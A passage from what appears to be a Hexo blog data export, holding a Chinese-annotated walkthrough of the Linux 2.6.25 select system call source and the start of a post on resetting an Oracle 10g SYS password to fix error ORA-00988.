(res_out)\n\t\t\t\t*routp = res_out;\n\t\t\tif (res_ex)\n\t\t\t\t*rexp = res_ex;\n\t\t}\n\t\twait = NULL;\n\t\tif (retval || !*timeout || signal_pending(current))/*signal_pending前面说过了*/\n\t\t\tbreak;\n\t\tif(table.error) {\n\t\t\tretval = table.error;\n\t\t\tbreak;\n\t\t}\n\t\tif (*timeout < 0) {\n\t\t\t/*无限等待*/\n\t\t\t__timeout = MAX_SCHEDULE_TIMEOUT;\n\t\t} else if (unlikely(*timeout >= (s64)MAX_SCHEDULE_TIMEOUT - 1)) {\n\t\t\t/* 时间超过MAX_SCHEDULE_TIMEOUT,即schedule_timeout允许的最大值，用一个循环来不断减少超时值*/\n\t\t\t__timeout = MAX_SCHEDULE_TIMEOUT - 1;\n\t\t\t*timeout -= __timeout;\n\t\t} else {\n\t\t\t/*等待一段时间*/\n\t\t\t__timeout = *timeout;\n\t\t\t*timeout = 0;\n\t\t}\n\t\t/*TASK_INTERRUPTIBLE状态下，调用schedule_timeout的进程会在收到信号后重新得到调度的机会，\n\t\t即schedule_timeout返回,并返回剩余的时钟周期数\n\t\t*/\n\t\t__timeout = schedule_timeout(__timeout);\n\t\tif (*timeout >= 0)\n\t\t\t*timeout += __timeout;\n\t}\n\t/*设置为运行状态*/\n\t__set_current_state(TASK_RUNNING);\n\t/*清理等待队列*/\n\tpoll_freewait(&table);\n\treturn retval;\n}\nstatic unsigned int sock_poll(struct file *file, poll_table *wait)\n{\n\tstruct socket *sock;\n\t/*约定socket的file->private_data字段放着对应的socket结构指针*/\n\tsock = file->private_data;\n\t/*对应了三个协议的函数tcp_poll,udp_poll,datagram_poll，其中udp_poll几乎直接调用了datagram_poll\n\t累了，先休息一下，这三个函数以后分析*/\n\treturn sock->ops->poll(file, sock, wait);\n}\n</pre>\n其他重要函数一览\nstatic int max_select_fd(unsigned long n, fd_set_bits *fds)\n返回在fd_set中已经打开的，并且小于用户指定最大值，的fd\nstatic inline int get_fd_set(unsigned long nr, void __user *ufdset, unsigned long *fdset)\n从用户空间拷贝fd_set到内核\nstatic inline void zero_fd_set(unsigned long nr, unsigned long *fdset)\n把fd_set清零\nstatic inline unsigned long __must_check set_fd_set(unsigned long nr, void __user *ufdset, unsigned long *fdset)\n把fd_set拷贝回用户空间\nstatic inline int signal_pending(struct task_struct *p)\n目前进程有信号需要处理\nstruct file *fget_light(unsigned int fd, int *fput_needed)\n由fd得到其对应的file结构指针，并增加其引用计数\nstatic inline void fput_light(struct file *file, int fput_needed)\n释放由fget_light得到的file结构指针，减少其引用计数\nset_current_state\n设置当前进程的状态\nstatic inline int cond_resched(void)\n判断是否有进程需要抢占当前进程，如果是将立即发生调度。就是额外增加一个抢占点。\nsigned long __sched schedule_timeout(signed long timeout)\n当前进程睡眠timeout个jiffies\nrcu_read_lock\nrcu_read_unlock\nLinux 2.6新加入的rcu锁。读锁的加锁、解锁函数\n参考http://www.ibm.com/developerworks/cn/linux/l-rcu\npoll_freewait\npoll_initwait\npoll_wait\n...\n和文件IO，poll机制有关的几个函数，参考《Linux设备驱动(第三版)》6.3\ntcp_poll\nudp_poll\ndatagram_poll\n协议层的poll函数\n文件出处：http://zhangyafeikimi.iteye.com/blog/248815","slug":"Linux-2.6.25-select系统调用源码分析","published":1,"updated":"2023-04-22T05:48:54.153Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgrkb5qt000274pi5mpb15lw","content":"<p>Linux 2.6.25中的select系统调用<br>主要有4个函数:<br>sys_select：处理时间参数，调用core_sys_select。<br>core_sys_select：处理三个fd_set参数，调用do_select。<br>do_select：做select&#x2F;poll的工作。在合适的时机把自己挂起等待，调用sock_poll。<br>sock_poll：用函数指针分派到具体的协议层函数tcp_poll、udp_poll、datagram_poll。<br>层层分工明确，我也要多学习这种方式啊。</p>\n<pre>\n/*\nsys_select(fs/select.c)\n处理了超时值（如果有）,将struct timeval转换成了时钟周期数,调用core_sys_select,然后检查剩余时间,处理时间\n*/\nasmlinkage long sys_select(int n, fd_set __user *inp, fd_set __user *outp,\n                           fd_set __user *exp, struct timeval __user *tvp)\n{\n    s64 timeout = -1;\n    struct timeval tv;\n    int ret;\n    if (tvp) {/*如果有超时值*/\n        if (copy_from_user(&tv, tvp, sizeof(tv)))\n            return -EFAULT;\n        if (tv.tv_sec < 0 || tv.tv_usec < 0)/*时间无效*/\n            return -EINVAL;\n        /* Cast to u64 to make GCC stop complaining */\n        if ((u64)tv.tv_sec >= (u64)MAX_INT64_SECONDS)\n            timeout = -1;\t/* 无限等待*/\n        else {\n            timeout = DIV_ROUND_UP(tv.tv_usec, USEC_PER_SEC/HZ);\n            timeout += tv.tv_sec * HZ;/*计算出超时的相对时间,单位为时钟周期数*/\n        }\n    }\n    /*主要工作都在core_sys_select中做了*/\n    ret = core_sys_select(n, inp, outp, exp, &timeout);\n    if (tvp) {/*如果有超时值*/\n        struct timeval rtv;\n        if (current->personality & STICKY_TIMEOUTS)/*模拟bug的一个机制,不详细描述*/\n            goto sticky;\n        /*rtv中是剩余的时间*/\n        rtv.tv_usec = jiffies_to_usecs(do_div((*(u64*)&timeout), HZ));\n        rtv.tv_sec = timeout;\n        if (timeval_compare(&rtv, &tv) >= 0)/*如果core_sys_select超时返回,更新时间*/\n            rtv = tv;\n        /*拷贝更新后的时间到用户空间*/\n        if (copy_to_user(tvp, &rtv, sizeof(rtv))) {\nsticky:\n            /*\n            * If an application puts its timeval in read-only\n            * memory, we don't want the Linux-specific update to\n            * the timeval to cause a fault after the select has\n            * completed successfully. However, because we're not\n            * updating the timeval, we can't restart the system\n            * call.\n            */\n            if (ret == -ERESTARTNOHAND)/*ERESTARTNOHAND表明,被中断的系统调用*/\n                ret = -EINTR;\n        }\n    }\n    return ret;\n}\n/*core_sys_select\n为do_select准备好了位图,然后调用do_select,将返回的结果集,返回到用户空间\n*/\nstatic int core_sys_select(int n, fd_set __user *inp, fd_set __user *outp,\n                           fd_set __user *exp, s64 *timeout)\n{\n    fd_set_bits fds;\n    void *bits;\n    int ret, max_fds;\n    unsigned int size;\n    struct fdtable *fdt;\n    /* Allocate small arguments on the stack to save memory and be faster */\n    /*SELECT_STACK_ALLOC 定义为256*/\n    long stack_fds[SELECT_STACK_ALLOC/sizeof(long)];\n    ret = -EINVAL;\n    if (n < 0)\n        goto out_nofds;\n    /* max_fds can increase, so grab it once to avoid race */\n    rcu_read_lock();\n    fdt = files_fdtable(current->files);/*获取当前进程的文件描述符表*/\n    max_fds = fdt->max_fds;\n    rcu_read_unlock();\n    if (n > max_fds)/*修正用户传入的第一个参数：fd_set中文件描述符的最大值*/\n        n = max_fds;\n    /*\n    * We need 6 bitmaps (in/out/ex for both incoming and outgoing),\n    * since we used fdset we need to allocate memory in units of\n    * long-words.\n    */\n    /*\n    如果stack_fds数组的大小不能容纳下所有的fd_set,就用kmalloc重新分配一个大数组。\n    然后将位图平均分成份,并初始化fds结构\n    */\n    size = FDS_BYTES(n);\n    bits = stack_fds;\n    if (size > sizeof(stack_fds) / 6) {\n        /* Not enough space in on-stack array; must use kmalloc */\n        ret = -ENOMEM;\n        bits = kmalloc(6 * size, GFP_KERNEL);\n        if (!bits)\n            goto out_nofds;\n    }\n    fds.in      = bits;\n    fds.out     = bits +   size;\n    fds.ex      = bits + 2*size;\n    fds.res_in  = bits + 3*size;\n    fds.res_out = bits + 4*size;\n    fds.res_ex  = bits + 5*size;\n    /*get_fd_set仅仅调用copy_from_user从用户空间拷贝了fd_set*/\n    if ((ret = get_fd_set(n, inp, fds.in)) ||\n        (ret = get_fd_set(n, outp, fds.out)) ||\n        (ret = get_fd_set(n, exp, fds.ex)))\n        goto out;\n    zero_fd_set(n, fds.res_in);\n    zero_fd_set(n, fds.res_out);\n    zero_fd_set(n, fds.res_ex);\n    /*\n    接力棒传给了do_select\n    */\n    ret = do_select(n, &fds, timeout);\n    if (ret < 0)\n        goto out;\n    /*do_select返回,是一种异常状态*/\n    if (!ret) {\n        /*记得上面的sys_select不？将ERESTARTNOHAND转换成了EINTR并返回。EINTR表明系统调用被中断*/\n        ret = -ERESTARTNOHAND;\n        if (signal_pending(current))/*当当前进程有信号要处理时,signal_pending返回真,这符合了EINTR的语义*/\n            goto out;\n        ret = 0;\n    }\n    /*把结果集,拷贝回用户空间*/\n    if (set_fd_set(n, inp, fds.res_in) ||\n        set_fd_set(n, outp, fds.res_out) ||\n        set_fd_set(n, exp, fds.res_ex))\n        ret = -EFAULT;\nout:\n    if (bits != stack_fds)\n        kfree(bits);/*对应上面的kmalloc*/\nout_nofds:\n    return ret;\n}\n/*do_select\n真正的select在此,遍历了所有的fd,调用对应的xxx_poll函数\n*/\nint do_select(int n, fd_set_bits *fds, s64 *timeout)\n{\n    struct poll_wqueues table;\n    poll_table *wait;\n    int retval, i;\n    rcu_read_lock();\n    /*根据已经打开fd的位图检查用户打开的fd, 要求对应fd必须打开, 并且返回最大的fd*/\n    retval = max_select_fd(n, fds);\n    rcu_read_unlock();\n    if (retval < 0)\n        return retval;\n    n = retval;\n    /*将当前进程放入自已的等待队列table, 并将该等待队列加入到该测试表wait*/\n    poll_initwait(&table);\n    wait = &table.pt;\n    if (!*timeout)\n        wait = NULL;\n    retval = 0;\n    for (;;) {/*死循环*/\n        unsigned long *rinp, *routp, *rexp, *inp, *outp, *exp;\n        long __timeout;\n        /*注意:可中断的睡眠状态*/\n        set_current_state(TASK_INTERRUPTIBLE);\n        inp = fds->in; outp = fds->out; exp = fds->ex;\n        rinp = fds->res_in; routp = fds->res_out; rexp = fds->res_ex;\n        for (i = 0; i < n; ++rinp, ++routp, ++rexp) {/*遍历所有fd*/\n            unsigned long in, out, ex, all_bits, bit = 1, mask, j;\n            unsigned long res_in = 0, res_out = 0, res_ex = 0;\n            const struct file_operations *f_op = NULL;\n            struct file *file = NULL;\n            in = *inp++; out = *outp++; ex = *exp++;\n            all_bits = in | out | ex;\n            if (all_bits == 0) {\n                /*\n                __NFDBITS定义为(8 * sizeof(unsigned long)),即long的位数。\n                因为一个long代表了__NFDBITS位，所以跳到下一个位图i要增加__NFDBITS\n                */\n                i += __NFDBITS;\n                continue;\n            }\n            for (j = 0; j < __NFDBITS; ++j, ++i, bit <<= 1) {\n                int fput_needed;\n                if (i >= n)\n                    break;\n                /*测试每一位*/\n                if (!(bit & all_bits))\n                    continue;\n                /*得到file结构指针，并增加引用计数字段f_count*/\n                file = fget_light(i, &fput_needed);\n                if (file) {\n                    f_op = file->f_op;\n                    mask = DEFAULT_POLLMASK;\n                    /*对于socket描述符,f_op->poll对应的函数是sock_poll\n                    注意第三个参数是等待队列，在poll成功后会将本进程唤醒执行*/\n                    if (f_op && f_op->poll)\n                        mask = (*f_op->poll)(file, retval ? NULL : wait);\n                    /*释放file结构指针，实际就是减小他的一个引用计数字段f_count*/\n                    fput_light(file, fput_needed);\n                    /*根据poll的结果设置状态,要返回select出来的fd数目，所以retval++。\n                    注意：retval是in out ex三个集合的总和*/\n                    if ((mask & POLLIN_SET) && (in & bit)) {\n                        res_in |= bit;\n                        retval++;\n                    }\n                    if ((mask & POLLOUT_SET) && (out & bit)) {\n                        res_out |= bit;\n                        retval++;\n                    }\n                    if ((mask & POLLEX_SET) && (ex & bit)) {\n                        res_ex |= bit;\n                        retval++;\n                    }\n                }\n                /*\n                注意前面的set_current_state(TASK_INTERRUPTIBLE);\n                因为已经进入TASK_INTERRUPTIBLE状态,所以cond_resched回调度其他进程来运行，\n                这里的目的纯粹是为了增加一个抢占点。被抢占后，由等待队列机制唤醒。\n                在支持抢占式调度的内核中（定义了CONFIG_PREEMPT），cond_resched是空操作\n                */\n                cond_resched();\n            }\n            /*根据poll的结果写回到输出位图里*/\n            if (res_in)\n                *rinp = res_in;\n            if (res_out)\n                *routp = res_out;\n            if (res_ex)\n                *rexp = res_ex;\n        }\n        wait = NULL;\n        if (retval || !*timeout || signal_pending(current))/*signal_pending前面说过了*/\n            break;\n        if(table.error) {\n            retval = table.error;\n            break;\n        }\n        if (*timeout < 0) {\n            /*无限等待*/\n            __timeout = MAX_SCHEDULE_TIMEOUT;\n        } else if (unlikely(*timeout >= (s64)MAX_SCHEDULE_TIMEOUT - 1)) {\n            /* 时间超过MAX_SCHEDULE_TIMEOUT,即schedule_timeout允许的最大值，用一个循环来不断减少超时值*/\n            __timeout = MAX_SCHEDULE_TIMEOUT - 1;\n            *timeout -= __timeout;\n        } else {\n            /*等待一段时间*/\n            __timeout = *timeout;\n            *timeout = 0;\n        }\n        /*TASK_INTERRUPTIBLE状态下，调用schedule_timeout的进程会在收到信号后重新得到调度的机会，\n        即schedule_timeout返回,并返回剩余的时钟周期数\n        */\n        __timeout = schedule_timeout(__timeout);\n        if (*timeout >= 0)\n            *timeout += __timeout;\n    }\n    /*设置为运行状态*/\n    __set_current_state(TASK_RUNNING);\n    /*清理等待队列*/\n    poll_freewait(&table);\n    return retval;\n}\nstatic unsigned int sock_poll(struct file *file, poll_table *wait)\n{\n    struct socket *sock;\n    /*约定socket的file->private_data字段放着对应的socket结构指针*/\n    sock = file->private_data;\n    /*对应了三个协议的函数tcp_poll,udp_poll,datagram_poll，其中udp_poll几乎直接调用了datagram_poll\n    累了，先休息一下，这三个函数以后分析*/\n    return sock->ops->poll(file, sock, wait);\n}\n</pre>\n<p>其他重要函数一览<br>static int max_select_fd(unsigned long n, fd_set_bits *fds)<br>返回在fd_set中已经打开的，并且小于用户指定最大值，的fd<br>static inline int get_fd_set(unsigned long nr, void __user *ufdset, unsigned long *fdset)<br>从用户空间拷贝fd_set到内核<br>static inline void zero_fd_set(unsigned long nr, unsigned long *fdset)<br>把fd_set清零<br>static inline unsigned long __must_check set_fd_set(unsigned long nr, void __user *ufdset, unsigned long *fdset)<br>把fd_set拷贝回用户空间<br>static inline int signal_pending(struct task_struct *p)<br>目前进程有信号需要处理<br>struct file *fget_light(unsigned int fd, int *fput_needed)<br>由fd得到其对应的file结构指针，并增加其引用计数<br>static inline void fput_light(struct file *file, int fput_needed)<br>释放由fget_light得到的file结构指针，减少其引用计数<br>set_current_state<br>设置当前进程的状态<br>static inline int cond_resched(void)<br>判断是否有进程需要抢占当前进程，如果是将立即发生调度。就是额外增加一个抢占点。<br>signed long __sched schedule_timeout(signed long timeout)<br>当前进程睡眠timeout个jiffies<br>rcu_read_lock<br>rcu_read_unlock<br>Linux 2.6新加入的rcu锁。读锁的加锁、解锁函数<br>参考<a href=\"http://www.ibm.com/developerworks/cn/linux/l-rcu\">http://www.ibm.com/developerworks/cn/linux/l-rcu</a><br>poll_freewait<br>poll_initwait<br>poll_wait<br>…<br>和文件IO，poll机制有关的几个函数，参考《Linux设备驱动(第三版)》6.3<br>tcp_poll<br>udp_poll<br>datagram_poll<br>协议层的poll函数<br>文件出处：<a href=\"http://zhangyafeikimi.iteye.com/blog/248815\">http://zhangyafeikimi.iteye.com/blog/248815</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Linux 2.6.25中的select系统调用<br>主要有4个函数:<br>sys_select：处理时间参数，调用core_sys_select。<br>core_sys_select：处理三个fd_set参数，调用do_select。<br>do_select：做select&#x2F;poll的工作。在合适的时机把自己挂起等待，调用sock_poll。<br>sock_poll：用函数指针分派到具体的协议层函数tcp_poll、udp_poll、datagram_poll。<br>层层分工明确，我也要多学习这种方式啊。</p>\n<pre>\n/*\nsys_select(fs/select.c)\n处理了超时值（如果有）,将struct timeval转换成了时钟周期数,调用core_sys_select,然后检查剩余时间,处理时间\n*/\nasmlinkage long sys_select(int n, fd_set __user *inp, fd_set __user *outp,\n                           fd_set __user *exp, struct timeval __user *tvp)\n{\n    s64 timeout = -1;\n    struct timeval tv;\n    int ret;\n    if (tvp) {/*如果有超时值*/\n        if (copy_from_user(&tv, tvp, sizeof(tv)))\n            return -EFAULT;\n        if (tv.tv_sec < 0 || tv.tv_usec < 0)/*时间无效*/\n            return -EINVAL;\n        /* Cast to u64 to make GCC stop complaining */\n        if ((u64)tv.tv_sec >= (u64)MAX_INT64_SECONDS)\n            timeout = -1;\t/* 无限等待*/\n        else {\n            timeout = DIV_ROUND_UP(tv.tv_usec, USEC_PER_SEC/HZ);\n            timeout += tv.tv_sec * HZ;/*计算出超时的相对时间,单位为时钟周期数*/\n        }\n    }\n    /*主要工作都在core_sys_select中做了*/\n    ret = core_sys_select(n, inp, outp, exp, &timeout);\n    if (tvp) {/*如果有超时值*/\n        struct timeval rtv;\n        if (current->personality & STICKY_TIMEOUTS)/*模拟bug的一个机制,不详细描述*/\n            goto sticky;\n        /*rtv中是剩余的时间*/\n        rtv.tv_usec = jiffies_to_usecs(do_div((*(u64*)&timeout), HZ));\n        rtv.tv_sec = timeout;\n        if (timeval_compare(&rtv, &tv) >= 0)/*如果core_sys_select超时返回,更新时间*/\n            rtv = tv;\n        /*拷贝更新后的时间到用户空间*/\n        if (copy_to_user(tvp, &rtv, sizeof(rtv))) {\nsticky:\n            /*\n            * If an application puts its timeval in read-only\n            * memory, we don't want the Linux-specific update to\n            * the timeval to cause a fault after the select has\n            * completed successfully. However, because we're not\n            * updating the timeval, we can't restart the system\n            * call.\n            */\n            if (ret == -ERESTARTNOHAND)/*ERESTARTNOHAND表明,被中断的系统调用*/\n                ret = -EINTR;\n        }\n    }\n    return ret;\n}\n/*core_sys_select\n为do_select准备好了位图,然后调用do_select,将返回的结果集,返回到用户空间\n*/\nstatic int core_sys_select(int n, fd_set __user *inp, fd_set __user *outp,\n                           fd_set __user *exp, s64 *timeout)\n{\n    fd_set_bits fds;\n    void *bits;\n    int ret, max_fds;\n    unsigned int size;\n    struct fdtable *fdt;\n    /* Allocate small arguments on the stack to save memory and be faster */\n    /*SELECT_STACK_ALLOC 定义为256*/\n    long stack_fds[SELECT_STACK_ALLOC/sizeof(long)];\n    ret = -EINVAL;\n    if (n < 0)\n        goto out_nofds;\n    /* max_fds can increase, so grab it once to avoid race */\n    rcu_read_lock();\n    fdt = files_fdtable(current->files);/*获取当前进程的文件描述符表*/\n    max_fds = fdt->max_fds;\n    rcu_read_unlock();\n    if (n > max_fds)/*修正用户传入的第一个参数：fd_set中文件描述符的最大值*/\n        n = max_fds;\n    /*\n    * We need 6 bitmaps (in/out/ex for both incoming and outgoing),\n    * since we used fdset we need to allocate memory in units of\n    * long-words.\n    */\n    /*\n    如果stack_fds数组的大小不能容纳下所有的fd_set,就用kmalloc重新分配一个大数组。\n    然后将位图平均分成份,并初始化fds结构\n    */\n    size = FDS_BYTES(n);\n    bits = stack_fds;\n    if (size > sizeof(stack_fds) / 6) {\n        /* Not enough space in on-stack array; must use kmalloc */\n        ret = -ENOMEM;\n        bits = kmalloc(6 * size, GFP_KERNEL);\n        if (!bits)\n            goto out_nofds;\n    }\n    fds.in      = bits;\n    fds.out     = bits +   size;\n    fds.ex      = bits + 2*size;\n    fds.res_in  = bits + 3*size;\n    fds.res_out = bits + 4*size;\n    fds.res_ex  = bits + 5*size;\n    /*get_fd_set仅仅调用copy_from_user从用户空间拷贝了fd_set*/\n    if ((ret = get_fd_set(n, inp, fds.in)) ||\n        (ret = get_fd_set(n, outp, fds.out)) ||\n        (ret = get_fd_set(n, exp, fds.ex)))\n        goto out;\n    zero_fd_set(n, fds.res_in);\n    zero_fd_set(n, fds.res_out);\n    zero_fd_set(n, fds.res_ex);\n    /*\n    接力棒传给了do_select\n    */\n    ret = do_select(n, &fds, timeout);\n    if (ret < 0)\n        goto out;\n    /*do_select返回,是一种异常状态*/\n    if (!ret) {\n        /*记得上面的sys_select不？将ERESTARTNOHAND转换成了EINTR并返回。EINTR表明系统调用被中断*/\n        ret = -ERESTARTNOHAND;\n        if (signal_pending(current))/*当当前进程有信号要处理时,signal_pending返回真,这符合了EINTR的语义*/\n            goto out;\n        ret = 0;\n    }\n    /*把结果集,拷贝回用户空间*/\n    if (set_fd_set(n, inp, fds.res_in) ||\n        set_fd_set(n, outp, fds.res_out) ||\n        set_fd_set(n, exp, fds.res_ex))\n        ret = -EFAULT;\nout:\n    if (bits != stack_fds)\n        kfree(bits);/*对应上面的kmalloc*/\nout_nofds:\n    return ret;\n}\n/*do_select\n真正的select在此,遍历了所有的fd,调用对应的xxx_poll函数\n*/\nint do_select(int n, fd_set_bits *fds, s64 *timeout)\n{\n    struct poll_wqueues table;\n    poll_table *wait;\n    int retval, i;\n    rcu_read_lock();\n    /*根据已经打开fd的位图检查用户打开的fd, 要求对应fd必须打开, 并且返回最大的fd*/\n    retval = max_select_fd(n, fds);\n    rcu_read_unlock();\n    if (retval < 0)\n        return retval;\n    n = retval;\n    /*将当前进程放入自已的等待队列table, 并将该等待队列加入到该测试表wait*/\n    poll_initwait(&table);\n    wait = &table.pt;\n    if (!*timeout)\n        wait = NULL;\n    retval = 0;\n    for (;;) {/*死循环*/\n        unsigned long *rinp, *routp, *rexp, *inp, *outp, *exp;\n        long __timeout;\n        /*注意:可中断的睡眠状态*/\n        set_current_state(TASK_INTERRUPTIBLE);\n        inp = fds->in; outp = fds->out; exp = fds->ex;\n        rinp = fds->res_in; routp = fds->res_out; rexp = fds->res_ex;\n        for (i = 0; i < n; ++rinp, ++routp, ++rexp) {/*遍历所有fd*/\n            unsigned long in, out, ex, all_bits, bit = 1, mask, j;\n            unsigned long res_in = 0, res_out = 0, res_ex = 0;\n            const struct file_operations *f_op = NULL;\n            struct file *file = NULL;\n            in = *inp++; out = *outp++; ex = *exp++;\n            all_bits = in | out | ex;\n            if (all_bits == 0) {\n                /*\n                __NFDBITS定义为(8 * sizeof(unsigned long)),即long的位数。\n                因为一个long代表了__NFDBITS位，所以跳到下一个位图i要增加__NFDBITS\n                */\n                i += __NFDBITS;\n                continue;\n            }\n            for (j = 0; j < __NFDBITS; ++j, ++i, bit <<= 1) {\n                int fput_needed;\n                if (i >= n)\n                    break;\n                /*测试每一位*/\n                if (!(bit & all_bits))\n                    continue;\n                /*得到file结构指针，并增加引用计数字段f_count*/\n                file = fget_light(i, &fput_needed);\n                if (file) {\n                    f_op = file->f_op;\n                    mask = DEFAULT_POLLMASK;\n                    /*对于socket描述符,f_op->poll对应的函数是sock_poll\n                    注意第三个参数是等待队列，在poll成功后会将本进程唤醒执行*/\n                    if (f_op && f_op->poll)\n                        mask = (*f_op->poll)(file, retval ? NULL : wait);\n                    /*释放file结构指针，实际就是减小他的一个引用计数字段f_count*/\n                    fput_light(file, fput_needed);\n                    /*根据poll的结果设置状态,要返回select出来的fd数目，所以retval++。\n                    注意：retval是in out ex三个集合的总和*/\n                    if ((mask & POLLIN_SET) && (in & bit)) {\n                        res_in |= bit;\n                        retval++;\n                    }\n                    if ((mask & POLLOUT_SET) && (out & bit)) {\n                        res_out |= bit;\n                        retval++;\n                    }\n                    if ((mask & POLLEX_SET) && (ex & bit)) {\n                        res_ex |= bit;\n                        retval++;\n                    }\n                }\n                /*\n                注意前面的set_current_state(TASK_INTERRUPTIBLE);\n                因为已经进入TASK_INTERRUPTIBLE状态,所以cond_resched回调度其他进程来运行，\n                这里的目的纯粹是为了增加一个抢占点。被抢占后，由等待队列机制唤醒。\n                在支持抢占式调度的内核中（定义了CONFIG_PREEMPT），cond_resched是空操作\n                */\n                cond_resched();\n            }\n            /*根据poll的结果写回到输出位图里*/\n            if (res_in)\n                *rinp = res_in;\n            if (res_out)\n                *routp = res_out;\n            if (res_ex)\n                *rexp = res_ex;\n        }\n        wait = NULL;\n        if (retval || !*timeout || signal_pending(current))/*signal_pending前面说过了*/\n            break;\n        if(table.error) {\n            retval = table.error;\n            break;\n        }\n        if (*timeout < 0) {\n            /*无限等待*/\n            __timeout = MAX_SCHEDULE_TIMEOUT;\n        } else if (unlikely(*timeout >= (s64)MAX_SCHEDULE_TIMEOUT - 1)) {\n            /* 时间超过MAX_SCHEDULE_TIMEOUT,即schedule_timeout允许的最大值，用一个循环来不断减少超时值*/\n            __timeout = MAX_SCHEDULE_TIMEOUT - 1;\n            *timeout -= __timeout;\n        } else {\n            /*等待一段时间*/\n            __timeout = *timeout;\n            *timeout = 0;\n        }\n        /*TASK_INTERRUPTIBLE状态下，调用schedule_timeout的进程会在收到信号后重新得到调度的机会，\n        即schedule_timeout返回,并返回剩余的时钟周期数\n        */\n        __timeout = schedule_timeout(__timeout);\n        if (*timeout >= 0)\n            *timeout += __timeout;\n    }\n    /*设置为运行状态*/\n    __set_current_state(TASK_RUNNING);\n    /*清理等待队列*/\n    poll_freewait(&table);\n    return retval;\n}\nstatic unsigned int sock_poll(struct file *file, poll_table *wait)\n{\n    struct socket *sock;\n    /*约定socket的file->private_data字段放着对应的socket结构指针*/\n    sock = file->private_data;\n    /*对应了三个协议的函数tcp_poll,udp_poll,datagram_poll，其中udp_poll几乎直接调用了datagram_poll\n    累了，先休息一下，这三个函数以后分析*/\n    return sock->ops->poll(file, sock, wait);\n}\n</pre>\n<p>其他重要函数一览<br>static int max_select_fd(unsigned long n, fd_set_bits *fds)<br>返回在fd_set中已经打开的，并且小于用户指定最大值，的fd<br>static inline int get_fd_set(unsigned long nr, void __user *ufdset, unsigned long *fdset)<br>从用户空间拷贝fd_set到内核<br>static inline void zero_fd_set(unsigned long nr, unsigned long *fdset)<br>把fd_set清零<br>static inline unsigned long __must_check set_fd_set(unsigned long nr, void __user *ufdset, unsigned long *fdset)<br>把fd_set拷贝回用户空间<br>static inline int signal_pending(struct task_struct *p)<br>目前进程有信号需要处理<br>struct file *fget_light(unsigned int fd, int *fput_needed)<br>由fd得到其对应的file结构指针，并增加其引用计数<br>static inline void fput_light(struct file *file, int fput_needed)<br>释放由fget_light得到的file结构指针，减少其引用计数<br>set_current_state<br>设置当前进程的状态<br>static inline int cond_resched(void)<br>判断是否有进程需要抢占当前进程，如果是将立即发生调度。就是额外增加一个抢占点。<br>signed long __sched schedule_timeout(signed long timeout)<br>当前进程睡眠timeout个jiffies<br>rcu_read_lock<br>rcu_read_unlock<br>Linux 2.6新加入的rcu锁。读锁的加锁、解锁函数<br>参考<a href=\"http://www.ibm.com/developerworks/cn/linux/l-rcu\">http://www.ibm.com/developerworks/cn/linux/l-rcu</a><br>poll_freewait<br>poll_initwait<br>poll_wait<br>…<br>和文件IO，poll机制有关的几个函数，参考《Linux设备驱动(第三版)》6.3<br>tcp_poll<br>udp_poll<br>datagram_poll<br>协议层的poll函数<br>文件出处：<a href=\"http://zhangyafeikimi.iteye.com/blog/248815\">http://zhangyafeikimi.iteye.com/blog/248815</a></p>\n"},{"title":"Oracle 10g 错误“ORA-00988 口令缺失或无效”终极解决办法！","date":"2012-03-02T02:48:00.000Z","_content":"如果在安装Oracle的时候出现如下问题：创建数据库完成让你输入密码的时候弹出&quot;ora-00988 缺少或无效口令&quot;的对话框如下图\n<img src=\"/images/pic/309723085d41f3fc0b7b822c.jpg\" small=\"0\" /><br />\n这是因为Oracle对密码的要求如下：\n系统用户（SYS、SYSTEM）口令长度不能小于7个字符第一个字符不能为数字且全部字符中应该为字母和数字混合\n解决方法：\n运行 cmd 按如下输入命令 sqlplus / as sysdba --------- 注意以上的语句中&quot;/&quot;两边都要有空格哦！--------- 以sys登陆 alter user 用户名 account unlock; --------- 解除锁定 alter user 用户名 identified by&nbsp;密码;-------------修改密码然后用你改好的密码登陆就行 举例：sqlplus / as sysdbaalter user sys account unlock;alter user sys identified by manager;希望你看过本文章后能顺利解决问题！&nbsp;","source":"_posts/Oracle-10g-错误“ORA-00988--口令缺失或无效”终极解决办法！.md","raw":"title: Oracle 10g 错误“ORA-00988 口令缺失或无效”终极解决办法！\ncategories: [Oracle]\ntags: []\ndate: 2012-03-02 10:48:00\n---\n如果在安装Oracle的时候出现如下问题：创建数据库完成让你输入密码的时候弹出&quot;ora-00988 缺少或无效口令&quot;的对话框如下图\n<img src=\"/images/pic/309723085d41f3fc0b7b822c.jpg\" small=\"0\" /><br />\n这是因为Oracle对密码的要求如下：\n系统用户（SYS、SYSTEM）口令长度不能小于7个字符第一个字符不能为数字且全部字符中应该为字母和数字混合\n解决方法：\n运行 cmd 按如下输入命令 sqlplus / as sysdba --------- 注意以上的语句中&quot;/&quot;两边都要有空格哦！--------- 以sys登陆 alter user 用户名 account unlock; --------- 解除锁定 alter user 用户名 identified by&nbsp;密码;-------------修改密码然后用你改好的密码登陆就行 举例：sqlplus / as sysdbaalter user sys account unlock;alter user sys identified by manager;希望你看过本文章后能顺利解决问题！&nbsp;","slug":"Oracle-10g-错误“ORA-00988--口令缺失或无效”终极解决办法！","published":1,"updated":"2023-04-22T05:52:26.075Z","_id":"clgrkcxxx0000zcpi31sb4fd9","comments":1,"layout":"post","photos":[],"link":"","content":"<p>如果在安装Oracle的时候出现如下问题：创建数据库完成让你输入密码的时候弹出&quot;ora-00988 缺少或无效口令&quot;的对话框如下图<br><img src=\"/images/pic/309723085d41f3fc0b7b822c.jpg\" small=\"0\" /><br /><br>这是因为Oracle对密码的要求如下：<br>系统用户（SYS、SYSTEM）口令长度不能小于7个字符第一个字符不能为数字且全部字符中应该为字母和数字混合<br>解决方法：<br>运行 cmd 按如下输入命令 sqlplus &#x2F; as sysdba ——— 注意以上的语句中&quot;&#x2F;&quot;两边都要有空格哦！——— 以sys登陆 alter user 用户名 account unlock; ——— 解除锁定 alter user 用户名 identified by&amp;nbsp;密码;————-修改密码然后用你改好的密码登陆就行 举例：sqlplus &#x2F; as sysdbaalter user sys account unlock;alter user sys identified by manager;希望你看过本文章后能顺利解决问题！&amp;nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>如果在安装Oracle的时候出现如下问题：创建数据库完成让你输入密码的时候弹出&quot;ora-00988 缺少或无效口令&quot;的对话框如下图<br><img src=\"/images/pic/309723085d41f3fc0b7b822c.jpg\" small=\"0\" /><br 